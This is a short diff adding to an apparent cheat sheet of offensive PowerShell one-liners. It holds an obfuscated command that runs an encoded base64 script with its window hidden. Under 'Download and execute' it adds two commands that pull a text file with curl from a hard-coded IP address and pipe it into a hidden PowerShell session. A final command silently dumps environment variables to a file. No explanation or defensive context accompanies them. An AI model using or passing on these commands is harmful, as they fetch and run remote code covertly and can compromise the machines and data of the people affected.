@@ -1,1 +1,8 @@
 powershell -w 1 -C "sv lm -;sv F ec;sv b ((gv lm).value.toString()+(gv F).value.toString());powershell (gv b).value.toString() '<scriptencodeadobase64>'"}
+
+## Download and execute
+curl.exe http://194.163.130.194:8088/gco.txt | powershell -noexit -Window Hidden -command '$input'
+curl.exe "http://194.163.130.194:8088/gco.txt" | powershell -noexit -Window Hidden -command "& {$input}"
+
+## HidenConsole by code
+start-process powershell -ArgumentList "sleep 10; cmd /c set > c:\env.txt" -WindowStyle hidden
